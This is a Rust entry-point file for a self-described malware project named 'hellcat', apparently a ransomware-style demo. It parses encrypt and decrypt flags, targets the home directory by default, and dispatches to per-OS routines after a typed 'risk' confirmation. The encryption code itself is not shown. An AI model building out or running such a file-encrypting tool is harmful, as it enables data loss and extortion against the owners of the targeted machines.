extern crate hellcat;

// All the required imports
use std::io::{self, Write, BufRead, BufReader};
use std::fs::File;
use hellcat::types::{MalwareAction};

#[tokio::main]
async fn main() -> std::io::Result<()> {

    // get the action 
    let actions = get_action();

    println!("[DEBUG] - {:?}", actions);
    
    if actions.path != "_home" {
        println!("[DEBUG] - Custom path: '{}'", actions.path);
    }

    // show the risk message
    user_validation();
    
    // first step is to detect the OS
    let os = std::env::consts::OS;

    // show the OS
    println!("[DEBUG] - Detected os: {}", os);

    // let's starts the malwre
    match os {
        "linux" => {
            hellcat::machine::linux::hellcat_linux(actions).await;
        },
        "macos" => {
            hellcat::machine::macos::hellcat_macos(actions).await;
        },
        "windows" => {
            hellcat::machine::windows::hellcat_windows(actions).await;
        },
        _ => {
            println!("[ERROR] - Unknown OS");
            // kill the program due to unknown OS
            std::process::exit(1);
        }
    }

    Ok(())
}


/**
 * User validation
 * ask to the user a validation before running the script
 */
fn user_validation() {
    loop {
        println!("This malware can be dangerous. Please type 'risk' to allow the run");
        print!("Type here: ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        io::stdin().read_line(&mut input).expect("Failed to read line");

        let input = input.trim();

        if input.to_lowercase() == "risk" {
            break;
        } else {
            println!("You didn't write 'risk' to allow the execution");
        }
    }
}

/**
 * Get the action to perform via args:
 */
fn get_action() -> MalwareAction {
    let mut decrypt:bool = false;
    let mut encrypt:bool = false;
    let mut path:String = "_home".to_string();

    for argument in std::env::args() {
        if argument == "-h" {
            println!("[LOGS] - Actions 'help' added");
            let _ = show_help();
            std::process::exit(0);
        } else if argument == "-d" {
            decrypt = true;
            println!("[LOGS] - Actions 'decrypt' added")
        } else if argument == "-e" {
            encrypt = true;
            println!("[LOGS] - Actions 'encrypt' added")
        } else if argument.starts_with("--path=") {
            path = argument.replace("--path=", "");
        }
    }

    return MalwareAction {
        decrypt: decrypt,
        encrypt: encrypt,
        path: path,
    }
}

fn show_help() -> io::Result<()> {
    // Open the file
    let file = File::open("src/helper/message.txt")?;

    // Create a buffered reader to read the file efficiently
    let reader = BufReader::new(file);

    // Iterate over each line in the file and print it
    for line in reader.lines() {
        println!("{}", line?);
    }

    std::process::exit(0);
}